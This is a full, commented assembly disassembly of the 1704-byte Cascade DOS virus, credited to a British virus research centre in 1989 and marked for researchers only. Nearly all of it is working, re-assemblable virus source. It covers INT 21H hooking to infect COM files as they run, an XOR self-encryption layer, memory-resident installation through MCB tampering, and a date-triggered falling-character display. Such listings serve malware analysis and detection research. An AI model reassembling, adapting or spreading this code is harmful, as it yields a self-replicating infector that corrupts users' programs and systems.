	page	65,132
	title	The 'Cascade' Virus (1704 version)
; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 British Computer Virus Research Centre                   บ
; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ
; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ
; บ                                                                          บ
; บ                    The 'Cascade' Virus (1704 version)                    บ
; บ                Disassembled by Joe Hirst,      March 1989                บ
; บ                                                                          บ
; บ                      Copyright (c) Joe Hirst 1989.                       บ
; บ                                                                          บ
; บ      This listing is only to be made available to virus researchers      บ
; บ                or software writers on a need-to-know basis.              บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

	; The virus occurs attached to the end of a COM file.  The first
	; three bytes of the program are stored in the virus, and replaced
	; by a branch to the beginning of the virus.

	; The disassembly has been tested by re-assembly using MASM 5.0.

RAM	SEGMENT AT 400H

	; System data

	ORG	4EH
BW044E	DW	?			; VDU display start address

	ORG	6CH
BW046C	DW	?			; System clock

RAM	ENDS

MCB	SEGMENT AT 0			; Memory control block references

MB0000	DB	?			; MCB signature
MW0001	DW	?			; MCB owner
MW0003	DW	?			; MCB size

MCB	ENDS

OPROG	SEGMENT AT 0			; Original program references

	ORG	100H
OW0100	DW	?
OB0102	DB	?

OPROG	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:OPROG

VIRLEN	EQU	OFFSET ENDADR-START
MAXLEN	EQU	OFFSET START-ENDADR-20H
JMPADR	=	OFFSET START-ENDADR-2

	ORG	16H
DW0016	DW	?			; PSP parent ID

	ORG	2CH
DW002C	DW	?			; PSP environment

	ORG	36H
DW0036	DW	?			; FHT segment

	ORG	100H

START:

DB0100	DB	1			; Encryption indicator

	; Virus entry point

ENTRY:	CLI
	MOV	BP,SP			; Save stack pointer
	CALL	BP0010			; \ Get address of BP0010
BP0010:	POP	BX			; /
	SUB	BX,OFFSET BP0010+2AH	; Standardise relocation reg
	TEST	DB0100[BX+2AH],1	; Is virus encrypted
	JZ	BP0030			; Branch if not
	LEA	SI,BP0030[BX+2AH]	; Address start of encrypted area
	MOV	SP,OFFSET ENDADR-BP0030	; Length of encrypted area
BP0020:	XOR	[SI],SI			; \ Decrypt
	XOR	[SI],SP			; /
	INC	SI			; \ Next address
	DEC	SP			; /
	JNZ	BP0020			; Repeat for all area
BP0030:	MOV	SP,BP			; Restore stack pointer
	JMP	BP0040			; Branch past data

	; Data

PROGRM	EQU	THIS DWORD
PRG_OF	DW	100H		; Original program offset
PRG_SGIDW	1021H		; Original program segment

INITAX	DW	0		; Initial AX value
PROG_1	DW	2DE9H		; \ First three bytes of program
PROG_2	DB	0DH		; /
	DB	0, 0

I1CBIO	EQU	THIS DWORD
I1C_OF	DW	0FF53H		; Interrupt 1CH offset
I1C_SG	DW	0F000H		; Interrupt 1CH segment

I21BIO	EQU	THIS DWORD
I21_OF	DW	1460H		; Interrupt 21H offset
I21_SG	DW	026AH		; Interrupt 21H segment

I28BIO	EQU	THIS DWORD
I28_OF	DW	1445H		; Interrupt 28H offset
I28_SG	DW	0270H		; Interrupt 28H segment

	DW	0		; - not referenced
F_ATTR	DW	0		; File attributes
F_DATE	DW	0E71H		; File date
F_TIME	DW	601FH		; File time
F_PATH	EQU	THIS DWORD
PATHOF	DW	044EH		; File pathname offset
PATHSG	DW	20FFH		; File pathname segment
F_SIZ1	DW	62DBH		; File size - low word
F_SIZ2	DW	0		; File size - high word
JUMP_1	DB	0E9H		; \ Jump instruction
JUMP_2	DW	1D64H		; /
NUMCOL	DB	0		; Number of display columns
NUMROW	DB	0		; Number of display rows
C80_SW	DB	0		; 80 column text switch
CURCHA	DB	0		; Current character
CURATT	DB	0		; Current attributes
SWITCH	DB	8		; Switches
				;	01 Int 1CH active
				;	02 Switch 2
				;	04 Switch 3 - not used
				;	08 No display
RAM_SG	DW	0		; Video RAM segment
VDURAM	DW	0		; VDU display start address
LOOPCT	DW	04F8H		; Timed loop count
I1CCNT	DW	0FDAH		; Int 1CH count
I1CMAX	DW	0FDAH		; Int 1CH random number maximum
NUMPOS	DW	0		; Number of display positions
RANPOS	DW	1		; Number of lines to affect
RANDOM	DW	8FB2H, 0AH, 0, 0, 100H, 0, 1414H, 14H

	; Main program start

BP0040:	CALL	BP0050			; \ Get address of BP0050
BP0050:	POP	BX			; /
	SUB	BX,OFFSET BP0050+2AH	; Standardise relocation reg
	MOV	PRG_SG[BX+2AH],CS	; Save original program segment
	MOV	INITAX[BX+2AH],AX	; Save initial AX value
	MOV	AX,PROG_1[BX+2AH]	; Get first 2 bytes of program
	MOV	OW0100,AX		; Replace them
	MOV	AL,PROG_2[BX+2AH]	; Get third byte of program
	MOV	OB0102,AL		; Replace it
	PUSH	BX
	MOV	AH,30H			; Get DOS version number function
	INT	21H			; DOS service
	POP	BX
	CMP	AL,2			; Version 2.X or above?
	JB	BP0060			; Branch if not
	MOV	AX,4BFFH		; Is virus active function
	XOR	DI,DI			; Clear register
	XOR	SI,SI			; Clear register
	INT	21H			; DOS service
	CMP	DI,55AAH		; Is virus already active
	JNE	BP0070			; Branch if not
BP0060:	STI
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	AX,INITAX[BX+2AH]	; Restore initial AX value
	JMP	PROGRM[BX+2AH]		; Branch to original program

BP0070:	PUSH	BX
	MOV	AX,3521H		; Get interrupt 21H function
	INT	21H			; DOS service
	MOV	AX,BX			; Move interrupt 21H offset
	POP	BX
	MOV	I21_OF[BX+2AH],AX	; Save interrupt 21H offset
	MOV	I21_SG[BX+2AH],ES	; Save interrupt 21H segment
	MOV	AX,0F000H		; \
	MOV	ES,AX			;  ) Address BIOS
	MOV	DI,0E008H		; /
	CMP	WORD PTR ES:[DI],'OC'	; \ Branch if not IBM BIOS
	JNE	BP0080			; /
	CMP	WORD PTR ES:[DI+2],'RP'	; \ Branch if not IBM BIOS
	JNE	BP0080			; /
	CMP	WORD PTR ES:[DI+4],' .'	; \ Branch if not IBM BIOS
	JNE	BP0080			; /
	CMP	WORD PTR ES:[DI+6],'BI'	; \ Branch if not IBM BIOS
	JNE	BP0080			; /
	CMP	WORD PTR ES:[DI+8],'M'	; \ IBM BIOS
	JE	BP0060			; /

	; Install virus

	ASSUME	ES:MCB,DS:NOTHING
BP0080:	MOV	AX,007BH		; Load size of virus in paragraphs
	MOV	BP,CS			; Get current segment
	DEC	BP			; \ Address back to MCB
	MOV	ES,BP			; /
	MOV	SI,DW0016		; Get parent ID
	MOV	MW0001,SI		; Store as owner in MCB
	MOV	DX,MW0003		; Get MCB size
	MOV	MW0003,AX		; Store virus size
	MOV	MB0000,4DH		; Store MCB identification
	SUB	DX,AX			; Subtract virus from original size
	DEC	DX			; 
	INC	BP			; Forward from MCB
	ADD	BP,AX			; Add size of virus
	INC	BP			; And of another MCB
	MOV	ES,BP			; Address new PSP segment
	PUSH	BX
	MOV	AH,50H			; Set current PSP function
	MOV	BX,BP			; New PSP segment
	INT	21H			; DOS service
	POP	BX
	XOR	DI,DI			; Clear register
	PUSH	ES			; \ Set stack segment to new PSP
	POP	SS			; /
	PUSH	DI
	LEA	DI,CPY040[BX+2AH]	; Address end of virus
	MOV	SI,DI			; And for source
	MOV	CX,VIRLEN		; Get length of virus
	STD				; Going downwards
	REPZ	MOVSB			; Copy virus
	PUSH	ES			; Push new segment
	LEA	CX,BP0090[BX+2AH]	; \ And next instruction
	PUSH	CX			; /
	RETF				; ... and load them

	; Now running in virus at end of new program segment

BP0090:	MOV	PRG_SG[BX+2AH],CS	; New segment in program address
	LEA	CX,DB0100[BX+2AH]	; Get length of original program
	REPZ	MOVSB			; Copy original program to new PSP
	MOV	DW0036,CS		; New segment in handle table address
	DEC	BP			; \ Address back to MCB
	MOV	ES,BP			; /
	MOV	MW0003,DX		; Store original program size
	MOV	MB0000,5AH		; Store MCB ident (last)
	MOV	MW0001,CS		; Store CS as owner in MCB
	INC	BP			; \ Forward again to PSP
	MOV	ES,BP			; /
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	LEA	SI,DB0100[BX+2AH]	; Address start of virus
	MOV	DI,OFFSET DB0100	; Start of program area in first area
	MOV	CX,VIRLEN		; Get length of virus
	CLD				; Copy forwards
	REPZ	MOVSB			; Copy virus to start of first area
	PUSH	ES			; Push segment of first area
	LEA	AX,BP0100		; \ Offset of next instruction
	PUSH	AX			; /
	RETF				; ... and load them

	; Now running in installed virus, first area

	ASSUME	ES:NOTHING
BP0100:	MOV	DW002C,0		; No environment pointer
	MOV	DW0016,CS		; Is its own parent
	PUSH	DS
	LEA	DX,INT_21		; Interrupt 21H routine
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	AX,2521H		; Set interrupt 21H function
	INT	21H			; DOS service
	POP	DS
	MOV	AH,1AH			; Set DTA function
	MOV	DX,0080H		; DTA address
	INT	21H			; DOS service
	CALL	GETCLK			; Copy system clock
	MOV	AH,2AH			; Get date function
	INT	21H			; DOS service
	CMP	CX,07C4H		; Year 1988?
	JA	BP0130			; Branch if after 1988
	JE	BP0110			; Branch if 1988
	CMP	CX,07BCH		; Year 1980?
	JNE	BP0130			; Branch if not
	PUSH	DS
	MOV	AX,3528H		; Get interrupt 28H function
	INT	21H			; DOS service
	MOV	I28_OF,BX		; Save interrupt 28H offset
	MOV	I28_SG,ES		; Save interrupt 28H segment
	MOV	AX,2528H		; Set interrupt 28H function
	MOV	DX,OFFSET INT_28	; Int 28H routine address
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	INT	21H			; DOS service
	POP	DS
	OR	SWITCH,8		; Set on No display switch
	JMP	BP0120

	; Year is 1988

BP0110:	CMP	DH,0AH			; October?
	JB	BP0130			; Branch if not
BP0120:	CALL	TIMCYC			; Time one clock cycle
	MOV	AX,1518H		; Upper limit - 5400
	CALL	RNDNUM			; Create random number
	INC	AX			; Add to random number
	MOV	I1CCNT,AX		; Set Int 1CH count
	MOV	I1CMAX,AX		; Set Int 1CH random no maximum
	MOV	RANPOS,1		; Set num of lines to affect to 1
	MOV	AX,351CH		; Get interrupt 1CH function
	INT	21H			; DOS service
	MOV	I1C_OF,BX		; Save interrupt 1CH offset
	MOV	I1C_SG,ES		; Save interrupt 1CH segment
	PUSH	DS
	MOV	AX,251CH		; Set interrupt 1CH function
	MOV	DX,OFFSET INT_1C	; Int 1CH routine address
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	INT	21H			; DOS service
	POP	DS
BP0130:	MOV	BX,-2AH			; Set up relocation register
	JMP	BP0060			; Branch to start program

	; Interrupt 21H routine

INT_21:	CMP	AH,4BH			; Load function?
	JE	I_2106			; Branch if yes
I_2102:	JMP	I21BIO			; Branch to original int 21H

	; Virus call

I_2104:	MOV	DI,55AAH		; Virus call - signal back
	LES	AX,I21BIO		; Load return address
	MOV	DX,CS			; Load segment
	IRET

	; Load and execute function

I_2106:	CMP	AL,0FFH			; Is this a virus call?
	JE	I_2104			; Branch if yes
	CMP	AL,0			; Load and execute?
	JNE	I_2102			; Branch if not
	PUSHF
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	DI
	PUSH	BP
	PUSH	ES
	PUSH	DS
	MOV	PATHOF,DX		; Save pathname offset
	MOV	PATHSG,DS		; Save pathname segment
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	AX,3D00H		; Open handle function
	INT	21H			; DOS service
	JB	I_2110			; Branch if error
	MOV	BX,AX			; Move file handle
	MOV	AX,5700H		; Get file date and time function
	INT	21H			; DOS service
	MOV	F_DATE,DX		; Save file date
	MOV	F_TIME,CX		; Save file time
	MOV	AH,3FH			; Read handle function
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	DX,OFFSET PROG_1	; \ First three bytes of program
	MOV	CX,3			; /
	INT	21H			; DOS service
	JB	I_2110			; Branch if error
	CMP	AX,CX			; Correct length read?
	JNE	I_2110			; Branch if error
	MOV	AX,4202H		; Move file pointer (EOF) function
	XOR	CX,CX			; \ No displacement
	XOR	DX,DX			; /
	INT	21H			; DOS service
	MOV	F_SIZ1,AX		; File size - low word
	MOV	F_SIZ2,DX		; File size - high word
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	CMP	PROG_1,5A4DH		; Is it an EXE file?
	JNE	I_2108			; Branch if not
	JMP	I_2124			; Dont infect

I_2108:	CMP	F_SIZ2,0		; File size - high word
	JA	I_2110			; Branch if file too big
	CMP	F_SIZ1,MAXLEN		; Maximum file size?
	JBE	I_2112			; Branch if file not too big
I_2110:	JMP	I_2124			; Dont infect

I_2112:	CMP	BYTE PTR PROG_1,0E9H	; Does program start with a branch
	JNE	I_2114			; Branch if not
	MOV	AX,F_SIZ1		; Get file size - low word
	ADD	AX,WORD PTR JMPADR	; Convert to infected offset
	CMP	AX,PROG_1+1		; Is it the same
	JE	I_2110			; Branch if already infected
I_2114:	MOV	AX,4300H		; Get file attributes function
	LDS	DX,F_PATH		; Pathname pointer
	INT	21H			; DOS service
	JB	I_2110			; Branch if error
	MOV	F_ATTR,CX		; Save file attributes
	XOR	CL,20H			; Change archive bit
	TEST	CL,27H			; Are there any attributes to change
	JZ	I_2116			; Branch if not
	MOV	AX,4301H		; Set file attributes function
	XOR	CX,CX			; No attributes
	INT	21H			; DOS service
	JB	I_2110			; Branch if error
I_2116:	MOV	AX,3D02H		; Open handle (R/W) function
	INT	21H			; DOS service
	JB	I_2110			; Branch if error
	MOV	BX,AX			; Move file handle
	MOV	AX,4202H		; Move file pointer (EOF) function
	XOR	CX,CX			; \ No displacement
	XOR	DX,DX			; /
	INT	21H			; DOS service
	CALL	CPYVIR			; Copy virus to program
	JNB	I_2118			; Branch if no error
	MOV	AX,4200H		; Move file pointer (Start) function
	MOV	CX,F_SIZ2		; File size - high word
	MOV	DX,F_SIZ1		; File size - low word
	INT	21H			; DOS service
	MOV	AH,40H			; Write handle function
	XOR	CX,CX			; Zero length (reset length}
	INT	21H			; DOS service
	JMP	I_2120			; Reset file details

I_2118:	MOV	AX,4200H		; Move file pointer (Start) function
	XOR	CX,CX			; \ No displacement
	XOR	DX,DX			; /
	INT	21H			; DOS service
	JB	I_2120			; Branch if error
	MOV	AX,F_SIZ1		; Get file size - low word
	ADD	AX,0FFFEH		; Convert to jump offset
	MOV	JUMP_2,AX		; Store in jump instruction
	MOV	AH,40H			; Write handle function
	MOV	DX,OFFSET JUMP_1	; Address to jump instruction
	MOV	CX,3			; Length of jump instruction
	INT	21H			; DOS service
I_2120:	MOV	AX,5701H		; Set file date and time function
	MOV	DX,F_DATE		; Get old file date
	MOV	CX,F_TIME		; Get old file time
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	MOV	CX,F_ATTR		; Get old file attributes
	TEST	CL,7			; System, read only or hidden?
	JNZ	I_2122			; Branch if yes
	TEST	CL,20H			; Archive?
	JNZ	I_2124			; Branch if yes
I_2122:	MOV	AX,4301H		; Set file attributes function
	LDS	DX,F_PATH		; Pathname pointer
	INT	21H			; DOS service
I_2124:	POP	DS
	POP	ES
	POP	BP
	POP	DI
	POP	SI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POPF
	JMP	I_2102			; Original interrupt 21H

	; Create random number

RNDNUM:	PUSH	DS
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	AX			; Save multiplier
	MOV	CX,7			; Seven words to move
	MOV	BX,OFFSET RANDOM+14	; Last word of randomiser
	PUSH	[BX]			; Save last word
RND010:	MOV	AX,[BX-2]		; Get previous word
	ADC	[BX],AX			; Add to current word
	DEC	BX			; \ Address previous word
	DEC	BX			; /
	LOOP	RND010			; Repeat for each word
	POP	AX			; Retrieve last word
	ADC	[BX],AX			; Add to first word
	MOV	DX,[BX]			; Get result
	POP	AX			; Recover multiplier
	OR	AX,AX			; Is there a multiplier?
	JZ	RND020			; Branch if not
	MUL	DX			; Multiply random number
RND020:	MOV	AX,DX			; Move result
	POP	DX
	POP	CX
	POP	BX
	POP	DS
	RET

	; Copy system clock

GETCLK:	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	PUSH	CX
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	MOV	CX,0040H		; \ Set DS to system RAM
	MOV	DS,CX			; /
	MOV	DI,OFFSET RANDOM	; Randomizer work area
	MOV	SI,006CH		; Address system clock
	MOV	CX,8			; Eight bytes to copy
	CLD
	REPZ	MOVSW			; Copy system clock
	POP	CX
	POP	DI
	POP	SI
	POP	ES
	POP	DS
	RET

	; Get character and attributes

	ASSUME	DS:CODE
GETCHA:	PUSH	SI
	PUSH	DS
	PUSH	DX
	MOV	AL,DH			; Get row number
	MUL	NUMCOL			; Number of visible columns
	MOV	DH,0			; Clear top of register
	ADD	AX,DX			; Add column number
	SHL	AX,1			; Multiply by two
	ADD	AX,VDURAM		; Add VDU display start address
	MOV	SI,AX			; Move character pointer
	TEST	C80_SW,0FFH		; Test 80 column text switch
	MOV	DS,RAM_SG		; Video RAM segment
	JZ	GTC030			; Branch if switch off
	MOV	DX,03DAH		; VDU status register
	CLI
GTC010:	IN	AL,DX			; Get VDU status
	TEST	AL,8			; Is it frame flyback time
	JNZ	GTC030			; Branch if yes
	TEST	AL,1			; Test toggle bit
	JNZ	GTC010			; Branch if on
GTC020:	IN	AL,DX			; Get VDU status
	TEST	AL,1			; Test toggle bit
	JZ	GTC020			; Branch if off
GTC030:	LODSW				; Load character and attribute
	STI
	POP	DX
	POP	DS
	POP	SI
	RET

	; Store character and attributes

STOCHA:	PUSH	DI
	PUSH	ES
	PUSH	DX
	PUSH	BX
	MOV	BX,AX
	MOV	AL,DH			; Get row number
	MUL	NUMCOL			; Number of visible columns
	MOV	DH,0			; Clear top of register
	ADD	AX,DX			; Add column number
	SHL	AX,1			; Multiply by two
	ADD	AX,VDURAM		; Add VDU display start address
	MOV	DI,AX			; Move character pointer
	TEST	C80_SW,0FFH		; Test 80 column text switch
	MOV	ES,RAM_SG		; Video RAM segment
	JZ	STO030			; Branch if switch off
	MOV	DX,03DAH		; VDU status register
	CLI
STO010:	IN	AL,DX			; Get VDU status
	TEST	AL,8			; Is it frame flyback time
	JNZ	STO030			; Branch if yes
	TEST	AL,1			; Test toggle bit
	JNZ	STO010			; Branch if on
STO020:	IN	AL,DX			; Get VDU status
	TEST	AL,1			; Test toggle bit
	JZ	STO020			; Branch if off
STO030:	MOV	AX,BX
	STOSB				; Store character and attribute
	STI
	POP	BX
	POP	DX
	POP	ES
	POP	DI
	RET

	; Delay loop

DELAY:	PUSH	CX
DEL010:	PUSH	CX
	MOV	CX,LOOPCT		; Get timed loop count
DEL020:	LOOP	DEL020
	POP	CX
	LOOP	DEL010
	POP	CX
	RET

	; Toggle speaker drive

CH_SND:	PUSH	AX
	IN	AL,61H			; Get port B
	XOR	AL,2			; Toggle speaker drive
	AND	AL,0FEH			; Switch off speaker modulate
	OUT	61H,AL			; Rewrite port B
	POP	AX
	RET

	; Is character 0, 32 or 255?

IGNORE:	CMP	AL,0			; Is it a zero?
	JE	IGN010			; Branch if yes
	CMP	AL,20H			; Is it a space?
	JE	IGN010			; Branch if yes
	CMP	AL,0FFH			; Is it FF?
	JE	IGN010			; Branch if yes
	CLC
	RET

IGN010:	STC
	RET

	; Graphic display character

GRAPHD:	CMP	AL,0B0H			; Is it below 176?
	JB	GRA010			; Branch if yes
	CMP	AL,0DFH			; Is it above 223?
	JA	GRA010			; Branch if yes
	STC
	RET

GRA010:	CLC
	RET

	; Time one clock cycle

TIMCYC:	PUSH	DS
	MOV	AX,0040H		; \ Set DS to system RAM
	MOV	DS,AX			; /
	STI
	ASSUME	DS:RAM
	MOV	AX,BW046C		; Get low word of system clock
TIM010:	CMP	AX,BW046C		; Has clock changed?
	JE	TIM010			; Branch if not
	XOR	CX,CX			; Clear register
	MOV	AX,BW046C		; Get low word of system clock
TIM020:	INC	CX			; Increment count
	JZ	TIM040			; Branch if now zero
	CMP	AX,BW046C		; Has clock changed?
	JE	TIM020			; Branch if not
TIM030:	POP	DS
	ASSUME	DS:NOTHING
	MOV	AX,CX			; Transfer count
	XOR	DX,DX			; Clear register
	MOV	CX,000FH		; \ Divide by 15
	DIV	CX			; /
	MOV	LOOPCT,AX		; Save timed loop count
	RET

TIM040:	DEC	CX			; Set to minus one
	JMP	SHORT TIM030

	; Cascade display routine

	ASSUME	DS:CODE
DISPLY:	MOV	NUMROW,18H		; Number of display rows
	PUSH	DS
	MOV	AX,0040H		; \ Set DS to system RAM
	MOV	DS,AX			; /
	ASSUME	DS:RAM
	MOV	AX,BW044E		; VDU display start address
	POP	DS
	ASSUME	DS:CODE
	MOV	VDURAM,AX		; Save VDU display start address
	MOV	DL,0FFH
	MOV	AX,1130H		; Get character generator information
	MOV	BH,0			; Int 1FH vector
	PUSH	ES
	PUSH	BP
	INT	10H			; VDU I/O
	POP	BP
	POP	ES
	CMP	DL,0FFH			; Is register unchanged?
	JE	DSP010			; Branch if yes
	MOV	NUMROW,DL		; Number of display rows (EGA)
DSP010:	MOV	AH,0FH			; Get VDU parameters
	INT	10H			; VDU I/O
	MOV	NUMCOL,AH		; Save number of columns
	MOV	C80_SW,0		; Set off 80 column text switch
	MOV	RAM_SG,0B000H		; Video RAM segment - Mono
	CMP	AL,7			; Mode 7?
	JE	DSP040			; Branch if yes
	JB	DSP020			; Branch if less
	JMP	DSP130			; Switch off speaker and return

DSP020:	MOV	RAM_SG,0B800H		; Video RAM segment
	CMP	AL,3			; Display mode 3?
	JA	DSP040			; Branch if above
	CMP	AL,2			; Display mode 2?
	JB	DSP040			; Branch if below
	MOV	C80_SW,1		; Set on 80 column text switch
	MOV	AL,NUMROW		; Number of display rows
	INC	AL			; Number, not offset
	MUL	NUMCOL			; Number of visible columns
	MOV	NUMPOS,AX		; Save number of display positions
	MOV	AX,RANPOS		; Get number of lines to affect
	CMP	AX,NUMPOS		; Number of display positions
	JBE	DSP030			; Branch if within range
	MOV	AX,NUMPOS		; Get number of display positions
DSP030:	CALL	RNDNUM			; Create random number
	INC	AX			; Add to random number
	MOV	SI,AX			; Use as count
DSP040:	XOR	DI,DI			; Set second count to zero
DSP050:	INC	DI			; Increment second count
	MOV	AX,NUMPOS		; Get number of display positions
	SHL	AX,1			; Multiply by two
	CMP	DI,AX			; Has second count reached this?
	JBE	DSP060			; Branch if not
	JMP	DSP130			; Switch off speaker and return

DSP060:	OR	SWITCH,2		; Set on switch 2
	MOV	AL,NUMCOL		; \ Number of visible columns
	MOV	AH,0			; / is upper limit
	CALL	RNDNUM			; Create random number
	MOV	DL,AL			; Random column number
	MOV	AL,NUMROW		; \ Number of display rows
	MOV	AH,0			; / is upper limit
	CALL	RNDNUM			; Create random number
	MOV	DH,AL			; Random row number
	CALL	GETCHA			; Get character and attributes
	CALL	IGNORE			; Is character 0, 32 or 255?
	JB	DSP050			; Branch if yes
	CALL	GRAPHD			; Is it a graphic display character
	JB	DSP050			; Branch if yes
	MOV	CURCHA,AL		; Save current character
	MOV	CURATT,AH		; Save current attributes
	MOV	CL,NUMROW		; Number of display rows
	MOV	CH,0			; Column zero
DSP070:	INC	DH			; Next row
	CMP	DH,NUMROW		; Was that the last row?
	JA	DSP110			; Branch if yes
	CALL	GETCHA			; Get character and attributes
	CMP	AH,CURATT		; Are attributes the same?
	JNE	DSP110			; Branch if not
	CALL	IGNORE			; Is character 0, 32 or 255?
	JB	DSP090			; Branch if yes
DSP080:	CALL	GRAPHD			; Is it a graphic display character
	JB	DSP110			; Branch if yes
	INC	DH			; Next row
	CMP	DH,NUMROW		; Was that the last row?
	JA	DSP110			; Branch if yes
	CALL	GETCHA			; Get character and attributes
	CMP	AH,CURATT		; Are attributes the same?
	JNE	DSP110			; Branch if not
	CALL	IGNORE			; Is character 0, 32 or 255?
	JNB	DSP080			; Branch if not
	CALL	CH_SND			; Toggle speaker drive
	DEC	DH			; Previous row
	CALL	GETCHA			; Get character and attributes
	MOV	CURCHA,AL		; Save current character
	INC	DH			; Next row
DSP090:	AND	SWITCH,0FDH		; Set off switch 2
	DEC	DH			; Previous row
	MOV	AL,20H			; Replace character with space
	CALL	STOCHA			; Store character and attributes
	INC	DH			; Next row
	MOV	AL,CURCHA		; Get current character
	CALL	STOCHA			; Store character and attributes
	JCXZ	DSP100			; Branch if end of count
	CALL	DELAY			; Delay loop
	DEC	CX			; Decrement count
DSP100:	JMP	SHORT DSP070

DSP110:	TEST	SWITCH,2		; Test switch 2
	JZ	DSP120			; Branch if off
	JMP	DSP050

DSP120:	CALL	CH_SND			; Toggle speaker drive
	DEC	SI			; Subtract from count
	JZ	DSP130			; Switch off speaker and return
	JMP	DSP040

	; Switch off speaker and return

DSP130:	IN	AL,61H			; Get port B
	AND	AL,0FCH			; Switch off speaker
	OUT	61H,AL			; Rewrite port B+
	RET

	; Interrupt 1CH routine

	ASSUME	DS:NOTHING
INT_1C:	TEST	SWITCH,9		; No display or already active?
	JNZ	I_1C40			; Branch if either are on
	OR	SWITCH,1		; Set on Int 1CH active switch
	DEC	I1CCNT			; Subtract from Int 1CH count
	JNZ	I_1C30			; Branch if not zero
	PUSH	DS
	PUSH	ES
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	PUSH	CS			; \ Set ES to CS
	POP	ES			; /
	ASSUME	DS:CODE
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	DI
	PUSH	BP
	MOV	AL,20H			; \ Signal end of interrupt
	OUT	20H,AL			; /
	MOV	AX,I1CMAX		; Get Int 1CH random no maximum
	CMP	AX,0438H		; Is it 1080 or above
	JNB	I_1C10			; Branch if yes
	MOV	AX,0438H		; Upper limit - 1080
I_1C10:	CALL	RNDNUM			; Create random number
	INC	AX			; Add to random number
	MOV	I1CCNT,AX		; Reset Int 1CH count
	MOV	I1CMAX,AX		; Reset Int 1CH random no maximum
	CALL	DISPLY			; Cascade display routine
	MOV	AX,3			; Upper limit - 3
	CALL	RNDNUM			; Create random number
	INC	AX			; Add to random number
	MUL	RANPOS			; Multiply by num of lines to affect
	JNB	I_1C20			; Is result more than a word?
	MOV	AX,-1			; Set to maximum
I_1C20:	MOV	RANPOS,AX		; Save number of lines to affect
	POP	BP
	POP	DI
	POP	SI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POP	ES
	POP	DS
	ASSUME	DS:NOTHING
I_1C30:	AND	SWITCH,0FEH		; Set off Int 1CH active switch
I_1C40:	JMP	I1CBIO			; Branch to original int 1CH

	; Interrupt 28H routine

INT_28:	TEST	SWITCH,8		; Test No display switch
	JZ	I_2830			; Branch if not
	PUSH	AX
	PUSH	CX
	PUSH	DX
	MOV	AH,2AH			; Get date function
	INT	21H			; DOS service
	CMP	CX,07C4H		; Year 1988?
	JB	I_2820			; Not yet - do nothing
	JA	I_2810			; After 1988
	CMP	DH,0AH			; October?
	JB	I_2820			; Not yet - do nothing
I_2810:	AND	SWITCH,0F7H		; Set off No display switch
I_2820:	POP	DX
	POP	CX
	POP	AX
I_2830:	JMP	I28BIO			; Branch to original int 28H

	; Copy virus to program

CPYVIR:	PUSH	ES
	PUSH	BX
	MOV	AH,48H			; Allocate memory function
	MOV	BX,006BH		; Length of virus
	INT	21H			; DOS service
	POP	BX
	JNB	CPY020			; Branch if no error
CPY010:	STC
	POP	ES
	RET

CPY020:	MOV	DB0100,1		; Set encryption indicator
	MOV	ES,AX			; Set target segment to allocated
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	XOR	DI,DI			; Start of allocated
	MOV	SI,OFFSET DB0100	; Start of virus
	MOV	CX,VIRLEN		; Length of virus
	CLD
	REPZ	MOVSB			; Copy virus
	MOV	DI,0023H		; Start of area to encrypt
	MOV	SI,OFFSET BP0030	; Address of area
	ADD	SI,F_SIZ1		; Length of target file
	MOV	CX,OFFSET ENDADR-BP0030	; Length to encrypt
CPY030:	XOR	ES:[DI],SI		; \ Encrypt
	XOR	ES:[DI],CX		; /
	INC	DI			; \ Next address
	INC	SI			; /
	LOOP	CPY030			; Repeat for all area
	MOV	DS,AX			; Allocated area segment
	MOV	AH,40H			; Write handle function
	XOR	DX,DX			; From start
	MOV	CX,VIRLEN		; Length of virus
	INT	21H			; DOS service
	PUSHF
	PUSH	AX
	MOV	AH,49H			; Free allocated memory function
	INT	21H			; DOS service
	POP	AX
	POPF
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	JB	CPY010			; Branch if error
	CMP	AX,CX			; Correct length written?
	JNE	CPY010			; Branch if error
	POP	ES
	CLC
CPY040:	RET

ENDADR	EQU	$

CODE	ENDS

	END	START
